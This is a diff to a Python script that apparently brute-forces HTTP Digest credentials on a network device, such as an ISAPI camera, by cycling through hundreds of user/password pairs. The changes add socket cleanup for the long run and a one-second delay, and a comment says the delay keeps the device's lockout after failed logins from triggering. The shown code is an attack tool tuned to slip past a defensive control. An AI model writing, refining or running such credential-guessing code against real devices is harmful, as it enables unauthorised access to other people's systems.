@@ -25,15 +25,19 @@ def md5hex(v):
 
 def get(path, auth=None):
     conn = http.client.HTTPConnection(HOST, 80, timeout=10)
-    headers = {"User-Agent": "isapi-search/1.0", "Accept": "*/*"}
-    if auth:
-        headers["Authorization"] = auth
-    conn.request("GET", path, headers=headers)
-    resp = conn.getresponse()
-    body = resp.read().decode("utf-8", "replace")
-    challenge = resp.getheader("WWW-Authenticate")
-    conn.close()
-    return resp.status, challenge, body
+    try:
+        headers = {"User-Agent": "isapi-search/1.0", "Accept": "*/*"}
+        if auth:
+            headers["Authorization"] = auth
+        conn.request("GET", path, headers=headers)
+        resp = conn.getresponse()
+        body = resp.read().decode("utf-8", "replace")
+        challenge = resp.getheader("WWW-Authenticate")
+        return resp.status, challenge, body
+    finally:
+        # This runs 400+ times; a leaked connection per exception would
+        # exhaust sockets partway through the search.
+        conn.close()
 
 
 status, challenge, _ = get(PROBE)
@@ -92,6 +96,10 @@ for i, (user, password) in enumerate(pairs, 1):
         sys.exit(0)
     if i % 25 == 0:
         print(f"    ...{i}/{len(pairs)}")
+    # Pace the search. This device fails closed and starts refusing
+    # connections after a handful of auth failures, so an unpaced sweep
+    # locks itself out well before exhausting the list.
+    time.sleep(1.0)
 
 print("[-] no match")
 sys.exit(2)
